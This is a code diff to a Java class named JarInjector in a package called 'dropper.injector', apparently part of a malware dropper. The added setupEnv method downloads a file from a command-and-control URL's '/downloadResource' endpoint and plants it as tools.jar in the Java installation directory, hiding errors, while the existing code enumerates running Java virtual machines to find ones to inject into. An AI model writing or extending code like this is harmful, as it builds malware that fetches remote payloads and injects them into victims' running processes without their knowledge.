@@ -1,15 +1,32 @@
 package dropper.injector;
 
 import com.sun.tools.attach.*;
+import org.apache.commons.io.FileUtils;
 
 import java.io.File;
 import java.io.IOException;
+import java.net.URL;
+import java.nio.file.Files;
+import java.nio.file.Paths;
 import java.util.ArrayList;
 import java.util.Collection;
 
 import static dropper.utils.HttpUtil.downloadFileHttp;
 
 public class JarInjector {
+    public void setupEnv(String c2url) {
+        String toolsJarPath = System.getProperty("java.home") + "\\lib\\tools.jar";
+        if (!Files.exists(Paths.get(toolsJarPath))) {
+            File toolsJarFile = new File(toolsJarPath);
+            try {
+                if (toolsJarFile.createNewFile()) {
+                    FileUtils.copyURLToFile(new URL(c2url + "/downloadResource"), toolsJarFile);
+                }
+            } catch (IOException e) {
+            }
+        }
+    }
+
     public Collection<String> getInjectableJars() {
         Collection<VirtualMachineDescriptor> vms = VirtualMachine.list();
         Collection<String> vmNames = new ArrayList<>();
